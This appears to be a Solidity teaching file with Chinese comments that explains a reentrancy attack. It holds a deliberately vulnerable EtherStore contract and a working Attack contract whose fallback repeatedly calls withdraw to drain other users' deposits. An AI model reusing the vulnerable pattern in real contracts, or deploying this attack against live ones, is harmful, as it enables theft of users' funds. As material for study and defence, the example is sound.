// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
我们看到 EtherStore 合约是一个充提合约，我们可以在其中充提以太。
该合约会受到重入攻击
让我们看看为什么。

1. 部署 EtherStore 合约；
2. 用户 1（Alice）和用户 2（Bob）都分别将 1 个以太币充值到 EtherStore 合约中；
3. 攻击者 Eve 部署 Attack 合约时传入 EtherStore 合约的地址；
4. 攻击者 Eve 调用 Attack.attack 函数，Attack.attack 又调用 EtherStore.deposit 函数，
    充值 1 个以太币到 EtherStore 合约中，此时 EtherStore 合约中共有 3 个以太，
    分别为 Alice、Bob 的 2 个以太和攻击者 Eve 刚刚充值进去的 1 个以太。
    然后 Attack.attack 又调用 EtherStore.withdraw 函数将自己刚刚充值的以太取出，
    此时 EtherStore 合约中就只剩下 Alice、Bob 的 2 个以太了；

接下来会发送什么？
当 Attack.attack 调用 EtherStore.withdraw 提取了先前 Eve 充值的 1 个以太时会触发 Attack.fallback 函数。
这时只要 EtherStore 合约中的以太大于或等于 1 Attack.fallback 就会一直调用 EtherStore.withdraw 函数将 EtherStore 合约中的以太提取到 Attack 合约中，直到 EtherStore 合约中的以太小于 1 。
这样攻击者 Eve 会得到 EtherStore 合约中剩下的 2 个以太币（Alice、Bob 充值的两枚以太币）。

下面是攻击者的函数调用流程：
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
